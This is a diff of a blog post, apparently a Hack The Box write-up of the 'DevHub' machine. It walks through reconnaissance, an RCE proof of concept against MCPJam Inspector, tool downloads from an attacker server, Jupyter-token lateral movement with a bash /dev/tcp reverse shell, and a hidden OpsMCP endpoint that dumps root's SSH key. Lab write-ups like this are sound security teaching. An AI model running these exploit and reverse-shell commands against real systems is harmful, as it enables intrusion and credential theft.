@@ -15,11 +15,15 @@ related_posts: false
 
 ## Reconnaissance
 
+{% include figure.liquid path="assets/img/devhub-writeups/01-htb-info-card.png" class="img-fluid rounded z-depth-1" %}
+
 Once the target IP is obtained, recon starts with `nmap`:
 
 ```
 nmap 10.129.245.216 -T5 -sCV -p-
 ```
+
+{% include figure.liquid path="assets/img/devhub-writeups/03-nmap-scan.png" class="img-fluid rounded z-depth-1" %}
 
 The scan reveals three open ports:
 
@@ -33,11 +37,15 @@ Visiting the site on port 80 reveals an internal landing page titled **DevHub �
 - **Analytics Dashboard** — a Jupyter environment, restricted to `localhost:8888`
 - **Code Repository** — an internal Git server, in maintenance mode
 
+{% include figure.liquid path="assets/img/devhub-writeups/02-devhub-homepage.png" class="img-fluid rounded z-depth-1" %}
+
 The Jupyter service on localhost:8888 is noted as a potential attack surface, but isn't the immediate priority.
 
 ## Initial exploitation — RCE on MCPJam Inspector
 
 Port 6274 exposes an MCP server reachable from the internet. The **Settings** page of the interface reveals the exact software version:
+
+{% include figure.liquid path="assets/img/devhub-writeups/04-mcpjam-inspector.png" class="img-fluid rounded z-depth-1" %}
 
 ```
 MCPJam Version: v1.4.2
@@ -48,12 +56,16 @@ A search on GitHub Security Advisories confirms this version is vulnerable:
 > **GHSA-232v-j27c-5pp6** — REC in MCPJam inspector due to HTTP Endpoint exposes (Critical severity)
 > Package `@mcpjam/inspector` (npm) — affected versions: `<= 1.4.2`, patched in `1.4.3`
 
+{% include figure.liquid path="assets/img/devhub-writeups/05-ghsa-advisory.png" class="img-fluid rounded z-depth-1" %}
+
 The official GitHub Advisory PoC allows RCE through a simple HTTP request:
 
 ```bash
 curl http://<target>:6274/api/mcp/connect --header "Content-Type: application/json" --data \
   "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
 ```
+
+{% include figure.liquid path="assets/img/devhub-writeups/06-poc-code.png" class="img-fluid rounded z-depth-1" %}
 
 In this case, the target is very likely a Linux machine, so the PoC is adapted using a Python variant available on Exploit-DB ([exploit 52625](https://www.exploit-db.com/exploits/52625)) to get a reverse shell instead.
 
@@ -68,6 +80,8 @@ nc -lvnp 4444
 ```
 mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
 ```
+
+{% include figure.liquid path="assets/img/devhub-writeups/07-shell-obtained.png" class="img-fluid rounded z-depth-1" %}
 
 ### Shell stabilization
 
@@ -93,7 +107,22 @@ This enables coloring, `clear`, and interactive programs like `vim` or `less`. (
 
 ## System enumeration and lateral movement
 
-Once the shell is stable, `linpeas.sh` is run to enumerate the system. Two things stand out in the process list:
+Before running `linpeas.sh` on the target, it needs to be transferred there. The simplest approach is to start a small HTTP server on the attacker side, in the folder containing the script:
+
+```bash
+python3 -m http.server 8000
+```
+
+Then, from the shell obtained on the target, the script is fetched with `wget` or `curl` and made executable:
+
+```bash
+wget http://<attacker_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+```
+
+Once `linpeas.sh` is transferred, it's run to enumerate the system. Two things stand out in the process list:
+
+{% include figure.liquid path="assets/img/devhub-writeups/08-linpeas-processes.png" class="img-fluid rounded z-depth-1" %}
 
 1. **A Jupyter server started by user `analyst`**, bound to localhost, with a **hardcoded token** visible in the command line:
 
@@ -108,6 +137,10 @@ Once the shell is stable, `linpeas.sh` is run to enumerate the system. Two thing
 root  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
 ```
 
+Checking cron jobs confirms this recurring root process:
+
+{% include figure.liquid path="assets/img/devhub-writeups/09-cron-jobs.png" class="img-fluid rounded z-depth-1" %}
+
 The hardcoded Jupyter token enables lateral movement to the `analyst` user. Interacting with the Jupyter API allows creating a remote terminal session:
 
 ```bash
@@ -120,7 +153,14 @@ curl -X POST 'http://127.0.0.1:8888/api/terminals' \
 
 Response: `{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}` — a terminal ID (`1`) is returned.
 
-Commands are then sent over websocket using [websocat](https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl):
+Commands are then sent over websocket using the [websocat](https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl) binary. It's transferred the same way as `linpeas.sh`: served from the attacker machine with the same Python server, then fetched from the shell (`mcp-dev`, or `analyst` once obtained):
+
+```bash
+wget http://<attacker_IP>:8000/websocat.x86_64-unknown-linux-musl -O /tmp/websocat
+chmod +x /tmp/websocat
+```
+
+Once the binary is in place, requests can be sent through the terminal:
 
 ```bash
 echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl \
@@ -138,7 +178,11 @@ echo '["stdin", "bash -i >& /dev/tcp/<attacker_IP>/9000 0>&1\r"]' | ./websocat.x
   "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
 ```
 
+{% include figure.liquid path="assets/img/devhub-writeups/10-analyst-shell.png" class="img-fluid rounded z-depth-1" %}
+
 The `analyst` shell is obtained and stabilized the same way as before. The user flag is found in `~/user.txt`.
+
+{% include figure.liquid path="assets/img/devhub-writeups/11-user-flag.png" class="img-fluid rounded z-depth-1" %}
 
 ## Privilege escalation — hidden endpoint on the OpsMCP server
 
@@ -150,6 +194,8 @@ opsmcp_secret_key_4f5a6b7c8d9e0f1a
 ```
 
 The file name matches the earlier root cron job (`/opt/opsmcp/server.py`). Inspecting `/opt/opsmcp/` shows `server.py` is owned by `analyst` (read-only):
+
+{% include figure.liquid path="assets/img/devhub-writeups/12-opsmcp-key-file.png" class="img-fluid rounded z-depth-1" %}
 
 ```
 analyst@devhub:~$ ls -la /opt/opsmcp/
@@ -176,7 +222,11 @@ Listing available tools via the API:
 curl 127.0.0.1:5000/tools/list -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
 ```
 
+{% include figure.liquid path="assets/img/devhub-writeups/13-tools-list.png" class="img-fluid rounded z-depth-1" %}
+
 … only returns 4 "public" tools (`ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`). However, reading the full `server.py` source reveals an unlisted tool: **`ops._admin_dump`**, which dumps sensitive credentials (root SSH private key, or password hashes), gated behind a `confirm=true` parameter.
+
+{% include figure.liquid path="assets/img/devhub-writeups/14-admin-dump-code.png" class="img-fluid rounded z-depth-1" %}
 
 Triggering this hidden endpoint to retrieve root's SSH private key:
 
@@ -231,7 +281,11 @@ chmod 400 enigma_root_key
 ssh -i enigma_root_key root@10.129.245.216
 ```
 
+{% include figure.liquid path="assets/img/devhub-writeups/15-root-ssh-success.png" class="img-fluid rounded z-depth-1" %}
+
 Root access is obtained. The root flag is found in `/root/root.txt`.
+
+{% include figure.liquid path="assets/img/devhub-writeups/16-root-flag.png" class="img-fluid rounded z-depth-1" %}
 
 ## Recommendations
 
